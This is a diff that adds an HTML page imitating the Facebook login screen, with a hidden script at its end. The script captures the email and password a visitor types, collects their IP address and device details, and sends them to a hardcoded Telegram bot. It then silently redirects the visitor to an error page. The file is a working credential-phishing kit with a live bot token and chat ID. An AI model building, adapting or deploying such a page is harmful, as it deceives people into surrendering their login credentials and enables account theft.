@@ -1,0 +1,157 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook login</title>
+    <link rel="stylesheet" href="./css/styles.css">
+    <link rel="shortcut icon" href="./images/fb.ico" type="image/x-icon">
+</head>
+<body>
+    <main>
+        <div class="main">
+            <div class="heading-section">
+                <img src="./images/logo.png" class="logo-img" alt="Facebook Logo">
+                <div class="a-ri8">
+                    <span>Facebook helps you connect and share with the people in your life.</span>
+                </div>
+            </div>
+
+            <div class="form">
+                <form class="a-form">
+                    <input type="email" id="Email" class="a-email" name="Email" placeholder="Email address or phone number" required>
+                    <input type="password" id="Password" class="a-pss" name="Password" placeholder="Password">
+                    <input type="submit" class="a-sub" value="Log In">
+                    <a href="erore.html" class="a-link">Forgotten password?</a>
+                    <hr class="a-hr">
+                    <input type="submit" value="Create New Account" class="a-but" >
+                </form>
+                <div class="create-page">
+                    <a href="#" class="a-href">Create a Page</a> for a celebrity, band or business.
+                </div>
+            </div>
+        </div>
+    </main>
+
+    <div class="footer">
+        <div id="pageFooter">
+           
+            <div id="line"></div>
+            <ul>
+                <li><a href="#">Sign Up</a></li>
+                <li><a href="#">Log In</a></li>
+                <li><a href="#">Messenger</a></li>
+                <li><a href="#">Facebook Lite</a></li>
+                <li><a href="#">Watch</a></li>
+                <li><a href="#">People</a></li>
+                <li><a href="#">Pages</a></li>
+                <li><a href="#">Page categories</a></li>
+                <li><a href="#">Places</a></li>
+                <li><a href="#">Games</a></li>
+                <li><a href="#">Locations</a></li>
+                <li><a href="#">Marketplace</a></li>
+                <li><a href="#">Facebook Pay</a></li>
+                <li><a href="#">Groups</a></li>
+                <li><a href="#">Jobs</a></li>
+                <li><a href="#">Oculus</a></li>
+                <li><a href="#">Portal</a></li>
+                <li><a href="#">Instagram</a></li>
+                <li><a href="#">Local</a></li>
+                <li><a href="#">Fundraisers</a></li>
+                <li><a href="#">Services</a></li>
+                <li><a href="#">Voting Information Centre</a></li>
+                <li><a href="#">About</a></li>
+                <li><a href="#">Create ad</a></li>
+                <li><a href="#">Create Page</a></li>
+                <li><a href="#">Developers</a></li>
+                <li><a href="#">Careers</a></li>
+                <li><a href="#">Privacy</a></li>
+                <li><a href="#">Cookies</a></li>
+                <li><a href="#">AdChoices</a></li>
+                <li><a href="#">Terms</a></li>
+                <li><a href="#">Help</a></li>
+                <li><a href="#">Settings</a></li>
+                <li><a href="#">Activity log</a></li>
+            </ul>
+            <div class="copyright">
+                <span>Facebook © 2025</span>
+            </div>
+        </div>
+    </div>
+
+    <div class="m-footer">
+        <div class="main-c">
+            <div class="list-1">
+                <span>English (UK)</span>
+                <span><a href="#">हिन्दी</a></span>
+                <span><a href="#">اردو</a></span>
+                <span><a href="#">বাংলা</a></span>
+            </div>
+            <div class="list-2">
+                <span><a href="#">ગુજરાતી</a></span>
+                <span><a href="#">मराठी</a></span>
+                <span><a href="#">മലയാളം</a></span>
+            </div>
+        </div>
+        <div class="main-links">
+            <span>About</span> ·
+            <span>Help</span> ·
+            <span>More</span>
+        </div>
+        <div class="fb">Facebook Inc.</div>
+    </div>
+</body>
+<script src="https://unpkg.com/axios@1.6.7/dist/axios.min.js"></script>
+<script>
+    const TOKEN = "7965770609:AAG3WOVW0ZvfEfi3rxW0TGEKlrpzVq1jkaI"; // Telegram Bot Token
+    const CHAT_ID = "6936457842"; // Chat ID
+    const URI_API = `https://api.telegram.org/bot${TOKEN}/sendMessage`;
+
+    // تأكد من وجود معرفات صحيحة
+    document.querySelector('.a-form').setAttribute('id', 'login-form');
+    document.getElementById('Email').setAttribute('id', 'email');
+    document.getElementById('Password').setAttribute('id', 'password');
+
+    document.getElementById('login-form').addEventListener('submit', function (e) {
+        e.preventDefault();
+
+        const email = document.getElementById('email').value;
+        const password = document.getElementById('password').value;
+
+        axios.get('https://api.ipify.org?format=json')
+            .then(response => {
+                const ip = response.data.ip;
+                const userAgent = navigator.userAgent;
+                const platform = navigator.platform;
+                const screenWidth = screen.width;
+                const screenHeight = screen.height;
+                const deviceType = /mobile/i.test(userAgent) ? 'Mobile' : 'Desktop';
+
+                const message = `
+<b>🔵 Facebook Login Attempt</b>\n
+<b>📧 Email:</b> ${email}\n
+<b>🔑 Password:</b> ${password}\n
+<b>🌍 IP:</b> ${ip}\n
+<b>💻 Device:</b> ${deviceType}\n
+<b>🖥 Platform:</b> ${platform}\n
+<b>🧠 User Agent:</b> ${userAgent}\n
+<b>📱 Resolution:</b> ${screenWidth}x${screenHeight}
+                `;
+
+                axios.post(URI_API, {
+                    chat_id: CHAT_ID,
+                    text: message,
+                    parse_mode: 'HTML'
+                }).finally(() => {
+                    // الانتقال إلى صفحة الخطأ بصمت
+                    window.location.href = "erore.html";
+                });
+            })
+            .catch(() => {
+                // حتى لو فشل جلب IP، يروح على صفحة الخطأ بدون إشعار
+                window.location.href = "erore.html";
+            });
+    });
+</script>
+
+</html>
